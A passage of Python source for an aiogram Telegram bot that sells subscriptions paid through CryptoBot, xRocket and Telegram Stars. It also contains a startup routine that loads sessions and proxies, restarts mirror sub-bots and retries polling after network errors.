        pend = data.get("pend", {})
        pend[f"cb{inv_id}"] = {"user": cb.from_user.id, "plan": pk,
                               "ts": time.time(), "method": "cbot"}
        await state.update_data(pend=pend)
        caption = (
            bq(f"<b>{NAME}</b>  —  Оплата CryptoBot")
            + f"\n\n💳 <b>{pl['label']}</b> — <b>{pl['price']:g} USDT</b>"
            + f"\n🧾 <b>Invoice:</b> <code>{inv_id}</code>\n\n"
            + "Оплати в @CryptoBot по кнопке,\nзатем вернись и нажми <b>🔍 Проверить</b>."
        )
        await cb.message.edit_caption(
            caption=caption, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💳 Оплатить", url=pay_url)],
                [InlineKeyboardButton(text="🔍 Проверить",
                                      callback_data=f"sub:cc:{inv_id}:{pk}")],
                [InlineKeyboardButton(text="◀ Назад", callback_data="sub:pm:cbot")],
            ]),
        )
        await cb.answer()
        return

    # ── xrocket (USDT, everyone) ──
    if not XROCKET_TOKEN:
        await cb.answer("Оплата не настроена (XROCKET_TOKEN)", show_alert=True)
        return
    payload = {"kind": "sub", "plan": pk, "tgId": str(cb.from_user.id)}
    try:
        j = await xrocket_create_invoice(pl["price"], payload,
                                         f"{NAME} subscription {pl['label']}")
    except Exception as e:
        log.error("xrocket invoice failed: %s", e)
        await cb.answer("❌ Сервис оплаты недоступен", show_alert=True)
        return
    inv_id = j.get("id")
    pay_url = (j.get("links") or {}).get("telegramBotLink")
    if not inv_id or not pay_url:
        log.error("xrocket bad invoice: %s", j)
        await cb.answer("❌ Инвойс не создан", show_alert=True)
        return
    data = await state.get_data()
    pend = data.get("pend", {})
    pend[str(inv_id)] = {"user": cb.from_user.id, "plan": pk, "ts": time.time(),
                         "method": "xrocket"}
    await state.update_data(pend=pend)
    price_s = f"{pl['price']:g}"
    caption = (
        bq(f"<b>{NAME}</b>  —  Оплата")
        + f"\n\n💳 <b>{pl['label']}</b> — <b>{price_s} USDT</b>"
        + f"\n🧾 <b>Invoice:</b> <code>{inv_id}</code>\n\n"
        + "Оплати в @xrocket по кнопке,\nзатем вернись и нажми <b>🔍 Проверить</b>."
    )
    await cb.message.edit_caption(
        caption=caption, parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить", url=pay_url)],
            [InlineKeyboardButton(text="🔍 Проверить", callback_data=f"sub:check:{inv_id}")],
            [InlineKeyboardButton(text="◀ Назад", callback_data="sub:pm:xr")],
        ]),
    )
    await cb.answer()


@router.callback_query(F.data.startswith("sub:cc:"))
async def sub_cryptobot_check(cb: CallbackQuery, state: FSMContext):
    """sub:cc:<invoice_id>:<plan> — poll CryptoBot invoice status."""
    if _pilot_only(cb):
        await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
        return
    parts = cb.data.split(":")
    inv_id, pk = parts[2], parts[3]
    if not SUB_PLANS.get(pk):
        await cb.answer("❌", show_alert=True)
        return
    try:
        res = await cryptobot_api("getInvoices", {"invoice_ids": inv_id})
    except Exception as e:
        log.error("cryptobot status failed: %s", e)
        await cb.answer("❌ Сервис оплаты недоступен", show_alert=True)
        return
    items = res.get("items") or []
    status = (items[0].get("status") or "") if items else ""
    if status == "paid":
        subs = load_subs()
        activate_plan(subs, cb.from_user.id, pk)
        s, until = sub_quality(subs, cb.from_user.id)
        await cb.answer("✅ Оплата прошла, подписка активна!", show_alert=True)
        caption = (
            bq(f"<b>{NAME}</b>  —  Подписка ок")
            + f"\n\n✅ Состояние: <b>{s}</b> ({until})\nМожно пользоваться!"
        )
        await cb.message.edit_caption(
            caption=caption, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="◀ Назад", callback_data="back:home")],
            ]))
        await push_send_log(
            "Оплата (CryptoBot)",
            [f"✅ <code>{cb.from_user.id}</code> — план <b>{pk}</b>"
             f" invoice <code>{inv_id}</code>"])
    else:
        await cb.answer(f"⏳ статус: {status or 'не найден'}", show_alert=True)


@router.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    """Stars invoices are issued per user+plan; nothing else to verify
    server-side — approve within the 10s deadline."""
    await q.answer(ok=True)


@router.message(F.successful_payment)
async def on_successful_payment(msg: Message):
    sp = msg.successful_payment
    payload = sp.invoice_payload or ""
    try:
        kind, pk, uid_s = payload.split(":")
        uid = int(uid_s)
    except Exception:
        log.warning("stars payload broken: %r", payload)
        await msg.answer("⚠️ Платёж принят, но план не распознан — напиши админу.")
        return
    if pk in SUB_PLANS:
        subs = load_subs()
        activate_plan(subs, uid, pk)
    try:
        s, until = sub_quality(subs, uid)
        await msg.answer(
            bq(f"<b>{NAME}</b>  —  ⭐ Подписка ок")
            + f"\n\n✅ Состояние: <b>{s}</b> ({until})\nМожно пользоваться!")
    except Exception:
        pass
    log.info("stars paid: uid=%s plan=%s charge=%s amount=%s",
             uid, pk, sp.telegram_payment_charge_id, sp.total_amount)
    await push_send_log(
        "Оплата (Telegram Stars)",
        [f"✅ <code>{uid}</code> — план <b>{pk}</b>",
         f"⭐ {sp.total_amount} | charge <code>{sp.telegram_payment_charge_id}</code>"])
    set_current_user(f"( stars plan {pk} )")


@router.callback_query(F.data.startswith("sub:check"))
async def sub_check(cb: CallbackQuery, state: FSMContext):
    parts = cb.data.split(":")
    subs = load_subs()
    if len(parts) == 3:
        inv_id = parts[2]
        data = await state.get_data()
        pend = data.get("pend", {})
        info = pend.get(inv_id)
        if not info:
            info = {"user": cb.from_user.id, "plan": None, "ts": 0}
        try:
            j = await xrocket_get_invoice(inv_id)
        except Exception as e:
            log.error("xrocket status failed: %s", e)
            await cb.answer("\u274c \u0421\u0435\u0440\u0432\u0438\u0441 \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d", show_alert=True)
            return
        status = (j.get("status") or "").lower()
        plan_key = info.get("plan")
        pay_user = info.get("user", cb.from_user.id)
        d = j.get("data") or {}
        if isinstance(d, dict) and d.get("kind") == "sub":
            if d.get("plan") in SUB_PLANS:
                plan_key = d["plan"]
            try:
                pay_user = int(d.get("tgId") or pay_user)
            except (TypeError, ValueError):
                pass
        if status in ("paid", "confirmed", "success"):
            if plan_key and SUB_PLANS.get(plan_key):
                activate_plan(subs, pay_user, plan_key)
            await cb.answer("\u2705 \u041e\u043f\u043b\u0430\u0442\u0430 \u043f\u0440\u043e\u0448\u043b\u0430, \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u0430\u043a\u0442\u0438\u0432\u043d\u0430!", show_alert=True)
            s, until = sub_quality(subs, info["user"])
            caption = (
                bq(f"<b>{NAME}</b>  \u2014  \u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u043e\u043a")
                + f"\n\n\u2705 \u0421\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435: <b>{s}</b> ({until})\n"
                + "\u041c\u043e\u0436\u043d\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f!"
            )
            await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
                                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                              [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
                                          ]))
            return
        await cb.answer(f"\u23f3 \u0441\u0442\u0430\u0442\u0443\u0441: {status or 'unknown'}", show_alert=True)
    else:
        subs = load_subs()
        s, until = sub_quality(subs, cb.from_user.id)
        if s in ("admin", "forever", "active"):
            await cb.answer(f"\u2705 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u043e\u043a: {until}", show_alert=True)
        else:
            await cb.answer("\u23f3 \u043e\u043f\u043b\u0430\u0442\u0430 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430", show_alert=True)


@router.callback_query(F.data == "menu:subs")
async def menu_subs(cb: CallbackQuery, state: FSMContext):
    await sub_shop(cb, state)
# ── stale ───────────────────────────────────────────────
@router.callback_query()
async def stale_cb(cb: CallbackQuery):
    await cb.answer("\u26a0\ufe0f \u0421\u0435\u0441\u0441\u0438\u044f \u0438\u0441\u0442\u0435\u043a\u043b\u0430. /start", show_alert=True)


# ── run ─────────────────────────────────────────────────
async def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN missing")
        return
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    n = len(load_sessions())
    p = len(load_proxies())
    log.info("%s starting... sessions=%d proxies=%d paid=%d",
             NAME, n, p, len(load_paid_proxies()))


    # paid static proxies are the pin pool now \u2014 the free farm stays FROZEN
    # (proxies.txt kept as fallback; harvesting only via method-test.yml)
    log.info("paid proxies: %d | free fallback: %d",
             len(load_paid_proxies()), len(load_proxies()))

    # mirror sub-bots: restart any previously-registered mirrors before main polling
    try:
        from mirror import _mirror_store, start_mirror
        mstore = _mirror_store()
        for tok, vminfo in mstore.items():
            try:
                start_mirror(tok)
            except Exception as e:
                log.warning("mirror %s failed to start: %s", vminfo.get("username"), e)
        n_mirrors = sum(1 for v in mstore.values())
        if n_mirrors:
            log.info("mirrors started: %d", n_mirrors)
    except Exception as e:
        log.warning("mirror submodule unavailable: %s", e)

    # retry the whole polling loop on network hiccups
    global _BOT
    while True:
        bot = Bot(token=BOT_TOKEN)
        _BOT = bot
        try:
            # canonical data store: users/subs restored from Telegram
            store.init(bot, BOT_TOKEN)
            await store.bootstrap({"users": USERS_FILE, "subs": SUBS_FILE})
            await dp.start_polling(bot)
            break
        except TelegramNetworkError as e:
            log.error("network down: %s — retrying in 5s", e)
            try:
                await bot.session.close()
            except Exception:
                pass
            await asyncio.sleep(5)
        except Exception as e:
            log.error("polling crashed: %s — retrying in 5s", e)
            try:
                await bot.session.close()
            except Exception:
                pass
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(main())
